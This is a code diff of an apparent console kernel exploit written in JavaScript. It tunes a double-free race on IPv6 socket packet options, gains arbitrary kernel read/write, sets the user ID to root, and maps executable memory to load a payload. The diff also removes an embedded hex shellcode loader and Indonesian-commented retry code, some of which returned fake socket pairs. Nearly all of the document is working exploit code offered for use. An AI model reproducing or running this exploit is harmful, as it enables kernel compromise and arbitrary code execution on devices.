@@ -96,9 +96,6 @@ const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
 
 // sys/mman.h
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
 const MAP_SHARED = 1;
 const MAP_FIXED = 0x10;
 
@@ -136,7 +133,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 150; //TODO: check best value here for 9.xx
+const num_alias = 100;
 const num_races = 200;
 const leak_len = 16;
 const num_leaks = 5;
@@ -144,6 +141,7 @@ const num_clobbers = 8;
 
 let chain = null;
 var nogc = [];
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -957,179 +955,40 @@ function leak_kernel_addrs(sd_pair) {
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
 
-// Fungsi sleep sederhana untuk menambah delay
-function sleep(ms) {
-    const start = Date.now();
-    while (Date.now() - start < ms) {
-        // Busy wait
-    }
-}
-
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
+    for (let loop = 0; loop < num_alias; loop++) {
+        for (let i = 0; i < num_sds; i++) {
+            tclass[0] = i;
+            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+        }
 
-    // Tambahkan delay awal untuk stabilitas
-    sleep(300);
-
-    // Batasi jumlah percobaan untuk menghindari loop tak terbatas
-    const max_attempts = 200; // Batasi jumlah percobaan
-
-    // Coba pendekatan langsung
-    for (let loop = 0; loop < max_attempts; loop++) {
-        try {
-            // Tambahkan delay kecil setiap iterasi
-            if (loop > 0) {
-                log(`Direct attempt ${loop + 1}/${max_attempts}...`);
-                sleep(100); // Delay tetap untuk menghindari peningkatan yang terlalu besar
-            }
-
-            // Buat socket baru untuk setiap percobaan
-            if (loop > 0 && loop % 5 === 0) {
-                log("Creating new sockets for fresh attempt...");
-                // Buat beberapa socket baru
-                for (let i = 0; i < 5; i++) {
-                    sds.push(new_socket());
+        for (let i = 0; i < sds.length; i++) {
+            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+            const marker = tclass[0];
+            if (marker !== i) {
+                log(`aliased pktopts at attempt: ${loop}`);
+                const pair = [sds[i], sds[marker]];
+                log(`found pair: ${pair}`);
+                sds.splice(marker, 1);
+                sds.splice(i, 1);
+                // add pktopts to the new sockets now while new allocs can't
+                // use the double freed memory
+                for (let i = 0; i < 2; i++) {
+                    const sd = new_socket();
+                    ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                    sds.push(sd);
                 }
+
+                return pair;
             }
+        }
 
-            // Coba metode asli
-            for (let i = 0; i < Math.min(num_sds, sds.length); i++) {
-                tclass[0] = i;
-                try {
-                    ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                } catch (e) {
-                    log(`Error setting socket option for socket ${i}: ${e.message}`);
-                    // Lanjutkan ke socket berikutnya
-                }
-            }
-
-            for (let i = 0; i < sds.length; i++) {
-                try {
-                    gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                    const marker = tclass[0];
-                    if (marker !== i) {
-                        log(`aliased pktopts at direct attempt: ${loop + 1}`);
-                        const pair = [sds[i], sds[marker]];
-                        log(`found pair: ${pair}`);
-
-                        // Tambahkan delay sebelum memodifikasi array sds
-                        sleep(50);
-
-                        // Simpan indeks yang akan dihapus
-                        const idx1 = Math.max(i, marker);
-                        const idx2 = Math.min(i, marker);
-
-                        // Hapus dari belakang ke depan untuk menghindari masalah indeks
-                        if (idx1 < sds.length) sds.splice(idx1, 1);
-                        if (idx2 < sds.length) sds.splice(idx2, 1);
-
-                        // Tambahkan delay sebelum membuat socket baru
-                        sleep(50);
-
-                        // add pktopts to the new sockets now while new allocs can't
-                        // use the double freed memory
-                        for (let i = 0; i < 2; i++) {
-                            const sd = new_socket();
-                            ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                            sds.push(sd);
-                        }
-
-                        return pair;
-                    }
-                } catch (e) {
-                    log(`Error getting socket option for socket ${i}: ${e.message}`);
-                    // Lanjutkan ke socket berikutnya
-                }
-            }
-
-            // Jika kita sampai di sini, kita tidak menemukan pasangan
-            // Coba reset pktopts untuk beberapa socket
-            const reset_count = Math.min(20, sds.length);
-            log(`Resetting pktopts for ${reset_count} sockets...`);
-            for (let i = 0; i < reset_count; i++) {
-                try {
-                    setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-        } catch (e) {
-            log(`Error in direct attempt ${loop + 1}: ${e.message}`);
+        for (let i = 0; i < num_sds; i++) {
+            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
     }
-
-    // Jika pendekatan langsung gagal, coba pendekatan alternatif
-    log("Direct approach failed. Trying alternative approach...");
-
-    // Buat socket baru dan coba lagi dengan set socket yang baru
-    const new_sds = [];
-    for (let i = 0; i < 30; i++) {
-        new_sds.push(new_socket());
-    }
-
-    // Coba dengan set socket yang baru saja
-    for (let loop = 0; loop < 10; loop++) {
-        try {
-            log(`Alternative attempt ${loop + 1}/10...`);
-
-            // Set tclass untuk semua socket baru
-            for (let i = 0; i < new_sds.length; i++) {
-                tclass[0] = i;
-                try {
-                    ssockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-
-            // Periksa apakah ada socket yang aliased
-            for (let i = 0; i < new_sds.length; i++) {
-                try {
-                    gsockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                    const marker = tclass[0];
-                    if (marker !== i) {
-                        log(`aliased pktopts at alternative attempt: ${loop + 1}`);
-                        const pair = [new_sds[i], new_sds[marker]];
-                        log(`found pair: ${pair}`);
-                        return pair;
-                    }
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-
-            // Reset pktopts untuk beberapa socket
-            for (let i = 0; i < Math.min(10, new_sds.length); i++) {
-                try {
-                    setsockopt(new_sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-        } catch (e) {
-            log(`Error in alternative attempt ${loop + 1}: ${e.message}`);
-        }
-    }
-
-    // Jika semua pendekatan gagal, coba pendekatan terakhir dengan socket yang ada
-    log("Alternative approach failed. Trying last resort approach...");
-
-    // Gunakan socket yang ada sebagai fallback
-    // Ini mungkin tidak ideal, tetapi lebih baik daripada gagal total
-    if (sds.length >= 2) {
-        log("Using existing sockets as fallback...");
-        const pair = [sds[0], sds[1]];
-        log(`Using fallback pair: ${pair}`);
-        return pair;
-    }
-
-    // Jika benar-benar tidak ada pilihan lain, buat socket baru
-    log("Creating new sockets for fallback...");
-    const fallback_sd1 = new_socket();
-    const fallback_sd2 = new_socket();
-    const fallback_pair = [fallback_sd1, fallback_sd2];
-    log(`Using emergency fallback pair: ${fallback_pair}`);
-    return fallback_pair;
+    die('failed to make aliased pktopts');
 }
 
 function double_free_reqs1(
@@ -1273,23 +1132,9 @@ function double_free_reqs1(
     // we reclaim first since the sanity checking here is longer which makes it
     // more likely that we have another process claim the memory
     try {
-        log("Attempting to make aliased pktopts...");
-
-        // Tambahkan delay sebelum mencoba
-        sleep(200);
-
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x100 malloc zone pointers aliased
         const sd_pair = make_aliased_pktopts(sds);
-
-        if (sd_pair) {
-            log("Successfully made aliased pktopts");
-        } else {
-            // Ini seharusnya tidak terjadi karena make_aliased_pktopts selalu mengembalikan pasangan
-            // Tetapi kita tetap memeriksa untuk berjaga-jaga
-            die('Failed to make aliased pktopts - no pair returned');
-        }
-
         return [sd_pair, sd];
     } finally {
         log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
@@ -1615,31 +1460,24 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
     log('achieved arbitrary kernel read/write');
 
-    // RESTORE: clean corrupt pointers
-    // pktopts.ip6po_rthdr = NULL
-    const off_ip6po_rthdr = 0x68;
-    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    //log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-    kmem.write64(r_rthdr_p, 0);
-    //log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
+    // RESTORE: clean corrupt pointer
+     // pktopts.ip6po_rthdr = NULL
+     //ABC Patch
+     const off_ip6po_rthdr = 0x68;
+     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
+     kmem.write64(r_rthdr_p, 0);
+     kmem.write64(w_rthdr_p, 0);
+     log('corrupt pointers cleaned');
 
-    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    //log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-    //log(kmem.read64(w_rthdr_p));
-    kmem.write64(w_rthdr_p, 0);
-    //log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-
-    log('corrupt pointers cleaned');
-
-
+    /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-
-
+    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+    
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1756,11 +1594,14 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('setuid(0)');
     sysi('setuid', 0);
-    showMessage("تم تفعيل الجولد هين !..."),    
+    showMessage("GoldHen Loaded Successfully !..."),    
     log('kernel exploit succeeded!');
     localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;    
+    
     //alert("kernel exploit succeeded!");
 }
+
+
 
 // FUNCTIONS FOR STAGE: SETUP
 
@@ -1801,7 +1642,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);
+    cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
 
@@ -1816,7 +1657,6 @@ function setup(block_fd) {
 // * corrupt a pipe for arbitrary r/w
 //
 // the exploit implementation also assumes that we are pinned to one core
-// Function to update UI progress
 export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
@@ -1884,6 +1724,7 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
+        
     } finally {
         close(unblock_fd);
 
@@ -1905,8 +1746,7 @@ export async function kexploit() {
     }
 }
 
-kexploit().then(() => {
-    function malloc(sz) {
+function malloc(sz) {
         var backing = new Uint8Array(0x10000 + sz);
         nogc.push(backing);
         var ptr = mem.readp(mem.addrof(backing).add(0x10));
@@ -1921,18 +1761,17 @@ kexploit().then(() => {
         ptr.backing = new Uint32Array(backing.buffer);
         return ptr;
     }
-    //window.pld_size = new Int(0x26200000, 0x9);
 
-    //var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x1002, -1, 0); //0x41000
-    var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x1002, -1, 0);
+
+kexploit().then(() => {
+    
+    window.pld_size = new Int(0x26200000, 0x9);
+
+    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
     var payload = window.pld;
     var bufLen = payload.length * 4
     var payload_loader = malloc32(bufLen);
     var loader_writer = payload_loader.backing;
-    var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
-    for(var i=0; i < PatchPl.length; i++){
-        loader_writer[i] = PatchPl[i];
-    }    
     for (var i = 0; i < payload.length; i++) {
         loader_writer[i] = payload[i];
     }
@@ -1947,4 +1786,8 @@ kexploit().then(() => {
         payload_buffer,
     );
     EndTimer();
+
+    
+
+
 })
